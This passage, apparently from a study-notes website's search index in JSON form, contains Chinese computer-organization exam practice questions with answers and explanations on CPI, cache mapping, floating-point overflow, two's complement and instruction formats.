\u82e5\u5e72\u6761\u5fae\u6307\u4ee4\u53ef\u4ee5\u6784\u6210\u4e00\u4e2a\u5fae\u7a0b\u5e8f\uff0c\u800c\u4e00\u4e2a\u5fae\u7a0b\u5e8f\u5c31\u5bf9\u5e94\u4e00\u6761\uff08\u673a\u5668\uff09\u6307\u4ee4\u3002","title":"4.1. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 July # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun 1. Week 3 # 1.1. Wed # \u7a0b\u5e8fP \u5728\u673a\u5668M \u4e0a\u7684\u6267\u884c\u65f6\u95f4\u662f20 \u79d2\uff0c\u7f16\u8bd1\u4f18\u5316\u540e\uff0cP \u6267\u884c\u7684\u6307\u4ee4\u6570\u51cf\u5c11\u5230\u539f\u6765\u768470%\uff0c\u800cCPI \u589e\u52a0 \u5230\u539f\u6765\u76841.2 \u500d\uff0c\u5219P \u5728M \u4e0a\u7684\u6267\u884c\u65f6\u95f4\u662f [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e8.4 \u79d2 B\uff0e11.7 \u79d2 C\uff0e14 \u79d2 D\uff0e16.8 \u79d2 \u6ce8\uff1aCPI\u8868\u793a\u6267\u884c\u4e00\u6761\u6307\u4ee4\u6240\u9700\u8981\u7684\u65f6\u949f\u5468\u671f\u6570 = \u603b\u65f6\u949f\u5468\u671f\u6570/IC\uff1bIC\u8868\u793a\u603b\u6307\u4ee4\u6570 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8bbe\u7a0b\u5e8fP\u6709i \u6761\u6307\u4ee4\uff0c \u5219\u7f16\u8bd1\u4f18\u5316\u524d\uff0cCPI0\uff1d20/i\u3002\u7f16\u8bd1\u4f18\u5316\u540e\uff0c \u6307\u4ee4\u6761\u6570\u4e3ai x 70% \uff0cCPI\uff1d1.2 x 20/i \uff0c \u56e0\u800c\u7f16\u8bd1\u4f18\u5316\u540e\uff0cP \u5728M \u4e0a\u7684\u6267\u884c\u65f6\u95f4\uff1di x 70% x 1.2 x 20/i \uff1d16.8 \u79d2\u3002 1.2. Thu # \u5047\u5b9a\u57fa\u51c6\u7a0b\u5e8fA \u5728\u67d0\u8ba1\u7b97\u673a\u4e0a\u7684\u8fd0\u884c\u65f6\u95f4\u4e3a100 \u79d2\uff0c\u5176\u4e2d90 \u79d2\u4e3aCPU \u65f6\u95f4\uff0c\u5176\u4f59\u4e3aI/O \u65f6\u95f4\u3002\u82e5CPU \u901f\u5ea6\u63d0\u9ad850%\uff0cI/O \u901f\u5ea6\u4e0d\u53d8\uff0c\u5219\u8fd0\u884c\u57fa\u51c6\u7a0b\u5e8fA \u6240\u8017\u8d39\u7684\u65f6\u95f4\u662f [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e55 \u79d2 B\uff0e60 \u79d2 C\uff0e65 \u79d2 D\uff0e70 \u79d2 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aCPU \u901f\u5ea6\u63d0\u9ad850%\uff0c\u5373CPU \u6027\u80fd\u63d0\u9ad8\u6bd4\u4e3a1.5\uff0c\u6539\u8fdb\u4e4b\u540e\u7684CPU \u8fd0\u884c\u65f6\u95f4\uff1d90\u00f71.5\uff1d60 \u79d2\u3002I/O \u901f\u5ea6\u4e0d\u53d8\uff0c\u4ecd\u7ef4\u630110 \u79d2\uff0c\u6240\u4ee5\u8fd0\u884c\u57fa\u51c6\u7a0b\u5e8fA \u6240\u8017\u8d39\u7684\u65f6\u95f4\u4e3a70 \u79d2\u3002 1.3. Fri # \u5047\u8bbe\u67d0\u8ba1\u7b97\u673a\u6309\u5b57\u7f16\u5740\uff0cCache\u67094 \u4e2a\u884c\uff0cCache \u548c\u4e3b\u5b58\u4e4b\u95f4\u4ea4\u6362\u7684\u5757\u5927\u5c0f\u4e3a1 \u4e2a\u5b57\u3002\u82e5Cache \u7684\u5185\u5bb9\u521d \u59cb\u4e3a\u7a7a\uff0c\u91c7\u75282 \u8def\u7ec4\u76f8\u8054\u6620\u5c04\u65b9\u5f0f\u548cLRU \u66ff\u6362\u7b97\u6cd5\uff0c\u5f53\u8bbf\u95ee\u7684\u4e3b\u5b58\u5730\u5740\u4f9d\u6b21\u4e3a0\uff0c4\uff0c8\uff0c2\uff0c0\uff0c6\uff0c8\uff0c6\uff0c4\uff0c8 \u65f6\uff0c\u547d\u4e2dCache \u7684\u6b21\u6570\u4e3a [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e1 B\uff0e2 C\uff0e3 D\uff0e4 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aCache \u67094 \u4e2a\u884c\uff0c2 \u8def\u7ec4\u76f8\u8054\uff0c\u5373Cache \u88ab\u5206\u62102 \u7ec4\uff0c\u6bcf\u7ec42 \u884c\u3002\u4e3b\u5b58\u5730\u5740\u4e3a0\uff5e1\u30014\uff5e5\u30018\uff5e9 \u53ef\u6620\u5c04\u5230\u7b2c0 \u7ec4Cache\u4e2d\uff0c\u4e3b\u5b58\u5730\u5740\u4e3a2\uff5e3\u30016\uff5e7 \u53ef\u6620\u5c04\u5230\u7b2c1 \u7ec4 Cache\u4e2d\u3002Cache \u521d\u59cb\u4e3a\u7a7a\uff0c\u91c7\u7528LRU \u66ff\u6362 \u7b97\u6cd5\uff0c\u5f53\u8bbf\u95ee\u4e3b\u5b58\u768410 \u4e2a\u5730\u5740\u4f9d\u6b21\u4e3a0\uff0c4\uff0c8\uff0c2\uff0c0\uff0c6\uff0c8\uff0c6\uff0c4\uff0c8 \u65f6\uff0c\u547d\u4e2dCache\u7684\u6b21\u6570\u5171\u67093 \u6b21\uff0c\u5206\u522b\u53d1 \u751f\u5728\u7b2c7\u30018 \u548c10 \u6b65\u65f6\u3002 \u6ce8\uff1a\u8ba1\u6570\u5668\u7684\u53d8\u5316\u89c4\u5219 \u547d\u4e2d\u65f6\uff0c\u6240\u547d\u4e2d\u7684\u884c\u7684\u8ba1\u6570\u5668\u6e05\u96f6\uff0c\u6bd4\u5176\u4f4e\u7684\u8ba1\u6570\u5668\u52a01\uff0c\u5176\u4f59\u4e0d\u53d8\u3002 \u672a\u547d\u4e2d\u4e14\u8fd8\u6709\u7a7a\u95f2\u884c\u65f6\uff0c\u65b0\u88c5\u5165\u7684\u884c\u7684\u8ba1\u6570\u5668\u7f6e0\uff0c\u5176\u4f59\u5168\u52a01\u3002 \u672a\u547d\u4e2d\u4e14\u65e0\u7a7a\u95f2\u884c\u65f6\uff0c\u8ba1\u6570\u503c\u4e3a3\u7684\u4fe1\u606f\u5757\u88ab\u6dd8\u6c70\uff0c\u65b0\u88c5\u5165\u7684\u5757\u7684\u8ba1\u6570\u5668\u7f6e0\uff0c\u5176\u4f59\u5168\u52a01\u3002 1.4. Sat # \u5728\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u4e2d\uff0cCPU \u5185\u90e8\u5305\u62ec\u7a0b\u5e8f\u8ba1\u6570\u5668PC\u3001\u5b58\u50a8\u5668\u6570\u636e\u5bc4\u5b58\u5668MDR\u3001\u6307\u4ee4\u5bc4\u5b58\u5668IR \u548c\u5b58 \u50a8\u5668\u5730\u5740\u5bc4\u5b58\u5668MAR \u7b49\u3002\u82e5CPU \u8981\u6267\u884c\u7684\u6307\u4ee4\u4e3a\uff1aMOV R0 \uff0c100\uff08\u5373\u5c06\u6570\u503c100 \u4f20\u9001\u5230\u5bc4\u5b58\u5668R0 \u4e2d\uff09\uff0c\u5219CPU \u9996\u5148\u8981\u5b8c\u6210\u7684\u64cd\u4f5c\u662f \u3002[\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e100\u2192R0 B\uff0e100\u2192MDR C\uff0ePC\u2192MAR D\uff0ePC\u2192IR \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u65e0\u8bba\u8fd0\u884c\u4ec0\u4e48\u7c7b\u578b\u7684\u6307\u4ee4\uff0cCPU \u9996\u5148\u9700\u8981\u53d6\u6307\u4ee4\uff0c\u53d6\u6307\u4ee4\u9636\u6bb5\u7684\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u5c31\u662f\u5c06\u6307\u4ee4\u5730\u5740\uff08\u7a0b\u5e8f\u8ba1\u6570\u5668PC \u4e2d\u7684\u5185\u5bb9\uff09\u9001\u5f80\u5b58\u50a8\u5668\u5730\u5740\u5bc4\u5b58\u5668\u3002 1.5. Sun # \u6d6e\u70b9\u6570\u52a0\u51cf\u8fd0\u7b97\u8fc7\u7a0b\u4e00\u822c\u5305\u62ec\u5bf9\u9636\u3001\u5c3e\u6570\u8fd0\u7b97\u3001\u89c4\u683c\u5316\u3001\u820d\u4eba\u548c\u5224\u65ad\u6ea2\u51fa\u7b49\u6b65\u9aa4\u3002\u8bbe\u6d6e\u70b9\u6570\u7684\u9636\u7801\u548c \u5c3e\u6570\u5747\u91c7\u7528\u8865\u7801\u8868\u793a\uff0c\u4e14\u4f4d\u6570\u5206\u522b\u4e3a5 \u4f4d\u548c7 \u4f4d\uff08\u5747\u542b2 \u4f4d\u7b26\u53f7\u4f4d\uff09\u3002\u82e5\u6709\u4e24\u4e2a\u6570X\uff1d2^7\u00d729/32\uff0cY\uff1d2^5\u00d75/8\uff0c \u5219\u7528\u6d6e\u70b9\u52a0\u6cd5\u8ba1\u7b97X\uff0bY \u7684\u6700\u7ec8\u7ed3\u679c\u662f \u3002[\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e001111100010 B\uff0e001110100010 C\uff0e010000010001 D\uff0e\u53d1\u751f\u6ea2\u51fa \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6839\u636e\u9898\u610f\uff0cX \u53ef\u8bb0\u4e3a00,111;00,11101\uff08\u5206\u53f7\u524d\u4e3a\u9636\u7801\uff0c\u5206\u53f7\u540e\u4e3a\u5c3e\u6570\uff09 \uff0cY \u53ef\u8bb0\u4e3a00,101;00,10100\uff1b\u9996\u5148\u5bf9\u9636\uff0cX\u3001Y \u9636\u7801\u76f8\u51cf\uff0c\u537300,111 \u4e0000,101\uff1d00,111\uff0b11,011\uff1d00,010\uff08\u6700\u9ad8\u4f4d\u8fdb\u4f4d\u81ea\u7136\u4e22\u5f03\uff09 \uff0c\u53ef\u77e5X \u7684\u9636 \u7801\u6bd4Y \u7684\u9636\u7801\u59272\uff0c\u6839\u636e\u5c0f\u9636\u5411\u5927\u9636\u770b\u9f50\u7684\u539f\u5219\uff0c\u5c06Y \u7684\u9636\u7801\u52a02\uff0c\u5c3e\u6570\u53f3\u79fb2 \u4f4d\uff0c\u5f97Y \u4e3a00,111;00,00101\uff1b\u5c3e\u6570\u76f8\u52a0\uff0c\u537300,11101\uff0b00,00101\uff1d01,00010\uff0c\u5c3e\u6570\u76f8\u52a0\u7ed3\u679c\u7b26\u53f7\u4f4d\u4e3a01\uff0c\u6545\u9700\u8fdb\u884c\u53f3\u89c4\uff1b\u89c4\u683c\u5316\uff0c\u5c06\u5c3e\u6570\u53f3\u79fb1 \u4f4d\uff0c\u9636\u7801\u52a01\uff0c\u5f97X\uff0bY \u4e3a01,000;00,10001 \uff0c\u9636\u7801\u7b26\u53f7\u4f4d\u4e3a01\uff0c\u8bf4\u660e\u53d1\u751f\u6ea2\u51fa\u3002 2. Week 4 # 2.1. Mon # \u82e5x\uff1d103\uff0cy\uff1d\uff0d25\uff0c\u5219\u4e0b\u5217\u8868\u8fbe\u5f0f\u91c7\u75288 \u4f4d\u5b9a\u70b9\u8865\u7801\u8fd0\u7b97\u5b9e\u73b0\u65f6\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa\u7684\u662f [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0ex\uff0by B\uff0e\uff0dx\uff0by C\uff0ex\uff0dy D\uff0e\uff0dx\uff0dy \u6ce8\uff1a n \u4f4d\u8865\u7801\u5b9a\u70b9\u6574\u6570\u8868\u793a\u8303\u56f4\u4e3a [-2^n, 2^n-1] \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a8\u4f4d\u5b9a\u70b9\u8865\u7801\u80fd\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\u4e3a\uff1a\uff0d128\uff5e127\u3002A \u9879\uff0c\u7ed3\u679c\u4e3a78\uff0cB \u9879\uff0c\u7ed3\u679c\u4e3a\uff0d128\uff0cD \u9879\uff0c \u7ed3\u679c\u4e3a\uff0d78 \u90fd\u5728\u6b64\u8303\u56f4\u5185\u3002C \u9879\uff0c\u7ed3\u679c128 \u8d85\u8fc7\u4e868 \u4f4d\u5b9a\u70b9\u8865\u7801\u80fd\u8868\u793a\u7684\u6570\u7684\u8303\u56f4\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa\u3002 2.2. Tue # \u75313 \u4e2a\u201c1\u201d\u548c5 \u4e2a\u201c 0\u201d\u7ec4\u6210\u76848 \u4f4d\u4e8c\u8fdb\u5236\u8865\u7801\uff0c\u80fd\u8868\u793a\u7684\u6700\u5c0f\u6574\u6570\u662f [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e\uff0d126 B\uff0e\uff0d125 C\uff0e\uff0d32 D\uff0e\uff0d3 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u80fd\u8868\u793a\u7684\u6700\u5c0f\u6574\u6570\u4e00\u5b9a\u662f\u8d1f\u6570\uff0c\u7b26\u53f7\u4f4d\u5360\u75281 \u4e2a\u201c1\u201d\uff1b\u8d1f\u6570\u7684\u8865\u7801\u548c\u539f\u7801\u7684\u8f6c\u5316\u662f\uff1a\u539f\u7801\u7b26\u53f7\u4f4d\u4e0d \u53d8\uff0c\u6570\u503c\u90e8\u5206\u6309\u4f4d\u53d6\u53cd\uff0c\u672b\u4f4d\u52a0\u201c 1\u201d\u3002\u56e0\u6b64\u6700\u5c0f\u7684\u6574\u6570\u7684\u8865\u7801\u662f\u201c 10000011\u201d\uff0c\u539f\u7801\u4e3a\u201c 11111101\u201d\uff0c\u5373(\uff0d125)\u3002 2.3. Wed # \u8bbe\u5728\u7f51\u7edc\u4e2d\u4f20\u9001\u91c7\u7528\u5076\u6821\u9a8c\u7684ASCII \u7801\uff0c\u5f53\u6536\u5230\u7684\u6570\u636e\u4f4d\u4e3a1101 0100 \u65f6\uff0c\u53ef\u4ee5\u65ad\u5b9a [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e\u672a\u51fa\u9519 B\uff0e\u51fa\u73b0\u5076\u6570\u4f4d\u9519 C\uff0e\u672a\u51fa\u9519\u6216\u51fa\u73b0\u5076\u6570\u4f4d\u9519 D\uff0e\u51fa\u73b0\u5947\u6570\u4f4d\u9519 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4e00\u4f4d\u5947\u5076\u6821\u9a8c\u7801\u53ea\u80fd\u53d1\u73b0\u5947\u6570\u4f4d\u9519\u8bef\u3002\u672c\u9898\u4e2d\uff0c\u6536\u5230\u7684\u6570\u636e\u4e2d\u6709\u5076\u6570\u4e2a1\uff0c\u8fd9\u6837\u53ef\u80fd\u6ca1\u6709\u51fa\u9519\uff0c\u4e5f\u53ef\u80fd\u662f\u51fa\u73b0\u4e86\u5076\u6570\u4f4d\u9519\u8bef\uff08\u5947\u5076\u6821\u9a8c\u7801\u65e0\u6cd5\u53d1\u73b0\u5076\u6570\u4f4d\u9519\uff09\u3002 2.4. Thu # \u82e5[x] \u8865\uff1d (1 x_1 x_2 x_3 x_4 x_5 x_6)_B \uff0c\u5176\u4e2d x_i \u53d6 0 \u62161\uff0c\u82e5\u8981 x > -32 \uff0c\u5e94\u5f53\u6ee1\u8db3 \u3002 [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0ex1\u4e3a0\uff0c\u5176\u4ed6\u5404\u4f4d\u4efb\u610f B\uff0ex1 \u4e3a1\uff0c\u5176\u4ed6\u5404\u4f4d\u4efb\u610f C\uff0ex1 \u4e3a1\uff0cx2,x6\u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1 D\uff0ex1\u4e3a0 , x2,x6 \u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a[x]\u8865\u7684\u7b26\u53f7\u4f4d\u4e3a1\uff0c\u6240\u4ee5x \u4e00\u5b9a\u662f\u8d1f\u6570\u3002\u7edd\u5bf9\u503c\u8d8a\u5c0f\uff0c\u6570\u503c\u8d8a\u5927\uff0c\u6240\u4ee5\uff0c\u8981\u6ee1\u8db3x\uff1e\uff0d32\uff0c\u5219x \u7684 \u7edd\u5bf9\u503c\u5fc5\u987b\u5c0f\u4e8e32\u3002\u56e0\u6b64\uff0cx1\u4e3a1\uff0cx2, x6 \u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1\uff0c\u8fd9\u6837\uff0c\u5404\u4f4d\u53d6\u53cd\u672b\u5c3e\u52a01 \u540e\uff0cx1 \u4e00\u5b9a\u4e3a0\uff0cx2, x6 \u4e2d\u81f3\u5c11\u6709\u4e00\u4f4d\u4e3a1\uff0c\u8fd9\u4f7f\u5f97x \u7684\u7edd\u5bf9\u503c\u4fdd\u8bc1\u5c0f\u4e8e32\u3002 2.5. Fri # \u67d0\u8ba1\u7b97\u673a\u670916 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u91c7\u752832 \u4f4d\u5b9a\u957f\u6307\u4ee4\u5b57\u3002\u64cd\u4f5c\u7801\u5b57\u6bb5\uff08\u542b\u5bfb\u5740\u65b9\u5f0f\u4f4d\uff09\u4e3a8 \u4f4d\uff0cStore \u6307\u4ee4\u7684 \u6e90\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u64cd\u4f5c\u6570\u5206\u522b\u91c7\u7528\u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740\u548c\u57fa\u5740\u5bfb\u5740\u65b9\u5f0f\uff0c\u82e5\u57fa\u5740\u5bc4\u5b58\u5668\u53ef\u4f7f\u7528\u4efb\u4e00\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u4e14\u504f\u79fb\u91cf\u7528\u8865\u7801\u8868\u793a\uff0c\u5219Store \u6307\u4ee4\u4e2d\u504f\u79fb\u91cf\u7684\u53d6\u503c\u8303\u56f4\u662f \u3002 [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e\uff0d32768\uff5e\uff0b32767 B\uff0e\uff0d32767\uff5e\uff0b32768 C\uff0e\uff0d65536\uff5e\uff0b65535 D\uff0e\uff0d65535\uff5e\uff0b65536 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u91c7\u752832\u4f4d\u5b9a\u957f\u6307\u4ee4\u5b57\uff0c\u5176\u4e2d\u64cd\u4f5c\u7801\u4e3a8\u4f4d\uff0c\u4e24\u4e2a\u5730\u5740\u7801\u5171\u5360\u7528 32-8=24 \u4f4d\uff0c\u800c Store \u6307\u4ee4\u7684\u6e90\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u64cd\u4f5c\u6570\u5206\u522b\u91c7\u7528\u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740\u548c\u57fa\u5740\u5bfb\u5740\uff0c\u673a\u5668\u4e2d\u5171\u670916\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u4e00\u4e2a\u5bc4\u5b58\u5668\u9700\u8981log2(16)=4\u4f4d\uff0c\u6e90\u64cd\u4f5c\u6570\u4e2d\u7684\u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740\u7528\u63894\u4f4d\uff0c\u800c\u76ee\u7684\u64cd\u4f5c\u6570\u91c7\u7528\u57fa\u5740\u5bfb\u5740\u4e5f\u8981\u6307\u5b9a\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u540c\u6837\u7528\u63894\u4f4d\uff0c\u5219\u7559\u7ed9\u504f\u79fb\u5740\u7684\u4f4d\u6570\u4e3a16\u4f4d\u3002\u6307\u4ee4\u7f16\u5740\u65b9\u5f0f\u5982\u4e0b\u6240\u793a 16 \u4f4d\u8865\u7801\u53d6\u503c\u8303\u56f4\u4e3a\uff0d32768\uff5e\uff0b32767\uff0c\u6240\u4ee5\u504f\u79fb\u91cf\u53d6\u503c\u8303\u56f4\u4e3a\uff0d32768\uff5e\uff0b32767\u3002 2.6. Sat # \u67d0\u8ba1\u7b97\u673a\u7684\u63a7\u5236\u5668\u91c7\u7528\u5fae\u7a0b\u5e8f\u63a7\u5236\u65b9\u5f0f\uff0c \u5fae\u6307\u4ee4\u4e2d\u7684\u64cd\u4f5c\u63a7\u5236\u5b57\u6bb5\u91c7\u7528\u5b57\u6bb5\u76f4\u63a5\u7f16\u7801\u6cd5\uff0c \u5171\u670933\u4e2a\u5fae\u547d \u4ee4\uff0c\u6784\u62105 \u4e2a\u4e92\u65a5\u7c7b\uff0c\u5206\u522b\u5305\u542b7\u30013\u300112\u30015 \u548c6 \u4e2a\u5fae\u547d\u4ee4\uff0c\u5219\u64cd\u4f5c\u63a7\u5236\u5b57\u6bb5\u81f3\u5c11\u6709 \u3002 [\u676d\u5dde\u7535\u5b50\u79d1\u6280\u5927\u5b66] A\uff0e5 \u4f4d B\uff0e6 \u4f4d C\uff0e15 \u4f4d D\uff0e33 \u4f4d \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a33 \u4e2a\u5fae\u547d\u4ee4\u5206\u62105 \u4e2a\u4e92\u65a5\u7c7b\uff08\u53735 \u4e2a\u5b57\u6bb5\uff09\uff0c\u6839\u636e\u6bcf\u4e2a\u7c7b\u4e2d\u5fae\u547d\u4ee4\u7684\u591a\u5c11\u53ef\u4ee5\u5206\u522b\u786e\u5b9a\u5b57\u6bb5\u7684\u957f\u5ea6 \u4e3a3\u30012\u30014\u30013\u30013 \u4f4d\uff0c\u53c8\u56e0\u4e3a\u91c7\u7528\u76f4\u63a5\u7f16\u7801\u65b9\u5f0f\uff0c \u6240\u4ee5\u5b83\u4eec\u4e4b\u548c3\uff0b2\uff0b4\uff0b3\uff0b3\uff1d15 \u4e5f\u5c31\u662f\u64cd\u4f5c\u63a7\u5236\u5b57\u6bb5\u7684\u4f4d\u6570\u3002 2.7. Sun # \u5728\u8865\u7801\u8868\u793a\u7684\u673a\u5668\u4e2d\uff0c\u82e5\u5bc4\u5b58\u5668 A \u4e2d\u539f\u5b58\u7684\u6570\u4e3a (9E)_H \uff0c\u73b0\u5b58\u7684\u6570\u4e3a (CF)_H \uff0c\u5219\u8868\u660e\u6267\u884c\u7684\u4e00\u6761\u6307\u4ee4\u662f\u3002 [\u56fd\u9632\u79d1\u6280\u5927\u5b66] A\uff0e\u7b97\u672f\u5de6\u79fb B\uff0e\u903b\u8f91\u5de6\u79fb C\uff0e\u7b97\u672f\u53f3\u79fb D\uff0e\u903b\u8f91\u53f3\u79fb \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5bc4\u5b58\u5668A \u4e2d\u539f\u5b58\u5185\u5bb910011110\uff0c\u73b0\u5b58\u5185\u5bb911001111\uff0c\u8bf4\u660e\u6267\u884c\u4e86\u4e00\u6761\u7b97\u672f\u53f3\u79fb\u6307\u4ee4\u3002","title":"2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2020-july","text":"","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#_1","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#11-wed","text":"\u7a0b\u5e8fP \u5728\u673a\u5668M \u4e0a\u7684\u6267\u884c\u65f6\u95f4\u662f20 \u79d2\uff0c\u7f16\u8bd1\u4f18\u5316\u540e\uff0cP \u6267\u884c\u7684\u6307\u4ee4\u6570\u51cf\u5c11\u5230\u539f\u6765\u768470%\uff0c\u800cCPI \u589e\u52a0 \u5230\u539f\u6765\u76841.2 \u500d\uff0c\u5219P \u5728M \u4e0a\u7684\u6267\u884c\u65f6\u95f4\u662f [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e8.4 \u79d2 B\uff0e11.7 \u79d2 C\uff0e14 \u79d2 D\uff0e16.8 \u79d2 \u6ce8\uff1aCPI\u8868\u793a\u6267\u884c\u4e00\u6761\u6307\u4ee4\u6240\u9700\u8981\u7684\u65f6\u949f\u5468\u671f\u6570 = \u603b\u65f6\u949f\u5468\u671f\u6570/IC\uff1bIC\u8868\u793a\u603b\u6307\u4ee4\u6570 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8bbe\u7a0b\u5e8fP\u6709i \u6761\u6307\u4ee4\uff0c \u5219\u7f16\u8bd1\u4f18\u5316\u524d\uff0cCPI0\uff1d20/i\u3002\u7f16\u8bd1\u4f18\u5316\u540e\uff0c \u6307\u4ee4\u6761\u6570\u4e3ai x 70% \uff0cCPI\uff1d1.2 x 20/i \uff0c \u56e0\u800c\u7f16\u8bd1\u4f18\u5316\u540e\uff0cP \u5728M \u4e0a\u7684\u6267\u884c\u65f6\u95f4\uff1di x 70% x 1.2 x 20/i \uff1d16.8 \u79d2\u3002","title":"1.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#12-thu","text":"\u5047\u5b9a\u57fa\u51c6\u7a0b\u5e8fA \u5728\u67d0\u8ba1\u7b97\u673a\u4e0a\u7684\u8fd0\u884c\u65f6\u95f4\u4e3a100 \u79d2\uff0c\u5176\u4e2d90 \u79d2\u4e3aCPU \u65f6\u95f4\uff0c\u5176\u4f59\u4e3aI/O \u65f6\u95f4\u3002\u82e5CPU \u901f\u5ea6\u63d0\u9ad850%\uff0cI/O \u901f\u5ea6\u4e0d\u53d8\uff0c\u5219\u8fd0\u884c\u57fa\u51c6\u7a0b\u5e8fA \u6240\u8017\u8d39\u7684\u65f6\u95f4\u662f [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e55 \u79d2 B\uff0e60 \u79d2 C\uff0e65 \u79d2 D\uff0e70 \u79d2 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aCPU \u901f\u5ea6\u63d0\u9ad850%\uff0c\u5373CPU \u6027\u80fd\u63d0\u9ad8\u6bd4\u4e3a1.5\uff0c\u6539\u8fdb\u4e4b\u540e\u7684CPU \u8fd0\u884c\u65f6\u95f4\uff1d90\u00f71.5\uff1d60 \u79d2\u3002I/O \u901f\u5ea6\u4e0d\u53d8\uff0c\u4ecd\u7ef4\u630110 \u79d2\uff0c\u6240\u4ee5\u8fd0\u884c\u57fa\u51c6\u7a0b\u5e8fA \u6240\u8017\u8d39\u7684\u65f6\u95f4\u4e3a70 \u79d2\u3002","title":"1.2. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#13-fri","text":"\u5047\u8bbe\u67d0\u8ba1\u7b97\u673a\u6309\u5b57\u7f16\u5740\uff0cCache\u67094 \u4e2a\u884c\uff0cCache 